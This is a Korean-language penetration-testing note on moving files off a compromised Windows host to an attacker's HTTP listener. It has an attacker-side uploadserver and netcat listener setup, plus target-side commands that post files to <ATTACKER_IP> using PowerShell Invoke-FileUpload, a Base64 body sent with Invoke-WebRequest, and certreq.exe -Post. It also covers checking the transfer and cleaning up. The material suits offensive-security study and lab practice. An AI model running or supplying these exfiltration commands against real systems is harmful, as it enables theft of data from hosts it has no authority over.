---
tags:
  - 환경/windows
시작조건: ["Windows 대상 셸 확보", "대상에서 공격 호스트의 HTTP 수신 포트로 연결 가능"]
필요권한: ["대상 파일 읽기 권한", "공격 호스트에서 수신 파일 저장 권한"]
필요조건: ["업로드할 파일", "공격 호스트 HTTP 주소·포트", "PowerShell 또는 certreq.exe 중 하나"]
결과: ["수신 서버 계약과 요청 로그·exact 저장 파일로 확인한 Windows 대상 파일 회수", "신뢰할 송신본·수신본이 모두 있을 때의 선택 동일성 비교 또는 수신 형식 미확인 상태"]
---

# Windows HTTP 파일 회수

## 한 줄 판단

Windows 대상 셸에서 회수할 파일을 읽을 수 있고 공격 호스트의 HTTP 수신 포트에 연결할 수 있으면, 사용 중인 수신 서버가 해당 요청 형식을 저장하는지 먼저 확인한 뒤 전송 결과를 판단한다. `certreq.exe`의 `-Post` 요청 형식과 raw listener의 저장·decode 계약은 이 문서만으로 확인되지 않았으므로 회수 완료로 단정하지 않는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 대상 파일 | 현재 계정으로 파일 읽기 가능 | `Get-Item` | 경로·ACL과 잠금 상태 확인 |
| 네트워크 방향 | Windows 대상에서 `<ATTACKER_IP>:<PORT>` 연결 가능 | 수신 서버 요청 로그 | 주소·route·proxy·방화벽 확인 |
| 수신 방식 | 사용하는 client 요청 형식을 수신 서버가 저장할 수 있음 | 공격 호스트 listener의 입력 형식·저장 파일명 확인 | client와 수신 서버 형식을 맞춤 |
| 완료 기준 | 수신 서버가 요청을 기록하고 exact 수신 파일을 저장함 | 요청 로그, 저장 파일명·내용 형식 | 수신 성공 메시지만 있거나 저장 파일을 식별하지 못하면 완료로 판단하지 않음 |

## 실행

### PowerShell multipart 업로드

공격 호스트에서 업로드 서버를 시작한다.

`<ATTACKER_IP>`와 `<PORT>`는 Windows 대상이 연결할 공격 호스트 수신 주소와 포트, `<UPLOAD_RECEIVE_DIRECTORY>`는 공격 호스트에서 새로 만들 전용 수신 디렉터리다. `<SOURCE_FILE>`은 Windows 대상에서 현재 계정이 읽을 수 있는 절대 파일 경로다. `<RECEIVED_FILE>`은 uploadserver 요청 로그와 수신 디렉터리에서 이번 요청으로 생성됐음을 확인한 basename이다. uploadserver가 이 exact 파일을 저장했을 때 요청 로그·파일명·예상 내용 형식으로 기본 회수 결과를 판정하고, 신뢰할 송신본과 수신본이 모두 있을 때만 추가로 동일성을 비교한다.

```bash
test ! -e '<UPLOAD_RECEIVE_DIRECTORY>'
ss -ltnp 'sport = :<PORT>'
mkdir -m 700 '<UPLOAD_RECEIVE_DIRECTORY>'
python3 -m uploadserver --bind <ATTACKER_IP> --directory '<UPLOAD_RECEIVE_DIRECTORY>' <PORT> &
UPLOADSERVER_PID=$!
ps -p "$UPLOADSERVER_PID" -o pid,cmd
```

Windows 대상에 `PSUpload.ps1`이 있으면 함수를 불러와 파일을 전송한다.

```powershell
Import-Module .\PSUpload.ps1
Invoke-FileUpload -Uri http://<ATTACKER_IP>:<PORT>/upload -File <SOURCE_FILE>
```

### PowerShell Base64 POST

```powershell
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes('<SOURCE_FILE>'))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:<PORT>/ -Method POST -Body $b64
```

POST body를 어떤 파일로 저장하고 Base64를 어떻게 decode하는지는 이 문서만으로 정합화할 수 없다. 수신 서버의 입력·저장 계약을 확인하지 못했으면 `<DECODED_RECEIVED_FILE>`을 만들거나 회수 완료로 기록하지 않는다.

### certreq HTTP POST

공격 호스트의 raw HTTP listener는 요청 capture만 남길 수 있으며, `certreq.exe` 요청을 수신 파일로 복원하는 계약은 이 문서에서 미확인이다.

```bash
test ! -e '<RAW_HTTP_CAPTURE>'
ss -ltnp 'sport = :<PORT>'
sudo nc -lvnp <PORT> > '<RAW_HTTP_CAPTURE>' &
RAW_HTTP_LISTENER_PID=$!
ps -p "$RAW_HTTP_LISTENER_PID" -o pid,cmd
```

Windows 대상에서 파일을 POST한다.

```cmd
certreq.exe -Post -config http://<ATTACKER_IP>:<PORT>/ <SOURCE_FILE>
```

확인할 출력:

- PowerShell 업로드 완료 메시지 또는 공격 호스트 listener의 HTTP POST와 파일 내용.
- `certreq`가 timeout을 출력하거나 raw listener에 body가 도착해도 수신 파일이 복원됐다는 뜻은 아니다.
- 수신 서버의 요청 로그와 이번 요청으로 생성된 exact 수신 파일을 기본 완료 근거로 사용한다. 전송 손상 여부가 실제 판단을 바꾸고 신뢰할 송신본·수신본이 모두 있을 때만 두 파일의 크기와 SHA-256을 선택 비교한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 수신 서버 요청 로그와 이번 요청의 exact 저장 파일·예상 내용 형식 확인 | HTTP 파일 회수 완료 | 대상 파일 회수 | 필요한 분석 후 수신 파일 보관 여부 결정 |
| `certreq` timeout 또는 raw listener body 도착 | 요청 흔적만 확인 | 수신 파일 미확인 | 수신 서버 계약을 확인할 때까지 회수 완료로 기록하지 않음 |
| 선택 동일성 비교에서 송신본과 수신본 불일치 | 수신 형식·decode 또는 전송 문제 | 손상된 회수 파일 | 수신 서버의 저장·복원 과정을 확인한 뒤 재전송 |
| TCP 연결이 없음 | 주소·port·route·proxy 문제 | 업로드 경로 미확보 | 대상에서 공격 호스트까지의 연결 확인 |
| 파일 읽기 거부 | 현재 계정에 source 파일 권한 없음 | 업로드 시작 전 실패 | 파일 ACL·잠금·현재 token 확인 |

## 확인할 출력과 권한

- 파일 읽기, HTTP 연결, 요청 수신과 exact 파일 저장을 각각 확인한다. Hash 일치는 신뢰할 비교쌍이 있고 손상 판단에 필요한 경우의 추가 결과다.
- 대상 파일 회수는 파일 내용에 포함된 계정·hash·ticket의 유효성이나 권한을 입증하지 않는다.

## 변경 영향과 복구

Windows 대상의 `<SOURCE_FILE>`은 읽기만 하므로 이 문서의 복구 대상이 아니다. 공격 호스트에 새로 만든 listener·수신 디렉터리·raw capture와 선택적으로 decode한 파일만 정리한다.

| 생성 항목 | 기존 상태·식별값 | 정리 순서와 명령 | 완료 확인 |
|---|---|---|---|
| uploadserver listener | 실행 전 `ss -ltnp 'sport = :<PORT>'`, `<UPLOADSERVER_PID>`와 command line | Windows 전송 요청이 끝난 뒤 `kill <UPLOADSERVER_PID>` | `ps -p <UPLOADSERVER_PID>`에 process가 없고 해당 포트를 이번 PID가 듣지 않음 |
| 전용 수신 디렉터리와 업로드 파일 | 기존에 없던 `<UPLOAD_RECEIVE_DIRECTORY>`, 요청 로그와 디렉터리에서 확인한 exact `<RECEIVED_FILE>` | 필요한 분석을 마친 뒤 확인한 수신 파일만 `rm -- '<UPLOAD_RECEIVE_DIRECTORY>/<RECEIVED_FILE>'`, 빈 디렉터리는 `rmdir '<UPLOAD_RECEIVE_DIRECTORY>'` | `test ! -e '<UPLOAD_RECEIVE_DIRECTORY>'` 성공 |
| raw HTTP listener와 capture | 실행 전 포트 상태, `<RAW_HTTP_LISTENER_PID>`와 기존에 없던 `<RAW_HTTP_CAPTURE>` | 요청이 끝난 뒤 process가 남아 있으면 `kill <RAW_HTTP_LISTENER_PID>`; 필요한 분석을 마친 뒤 `rm -- '<RAW_HTTP_CAPTURE>'` | 기록한 PID와 exact capture 경로가 없음 |
| Base64 decode 결과 | 수신 서버의 저장·decode 계약이 확인된 경우에만 기존에 없던 `<DECODED_RECEIVED_FILE>`과 실제 decode 결과 | 필요한 분석을 마친 뒤 `rm -- '<DECODED_RECEIVED_FILE>'` | `test ! -e '<DECODED_RECEIVED_FILE>'` 성공 |

정리는 Windows 전송 process 종료 확인 → 공격 호스트 listener 종료 → 확인된 수신본 분석 → exact 로컬 파일 제거 순서로 수행한다. 동일성 비교의 수행 여부와 관계없이 요청이 끝나면 기록한 listener를 종료한다. listener 종료가 실패하면 PID와 command line을 다시 대조하며 모든 Python·netcat process를 이름으로 종료하지 않는다. 전송이 중단됐거나 `certreq`가 timeout이면 수신 서버 계약과 수신 파일이 확인되기 전에는 회수나 복구 완료로 판정하지 않는다.

## 관련 도구

- [[powershell]]
- [[netcat]]

## 관련 상태 라우터

- [[상황별 파일 전송]]

## 참고 링크

- [uploadserver](https://github.com/Densaugeo/uploadserver)
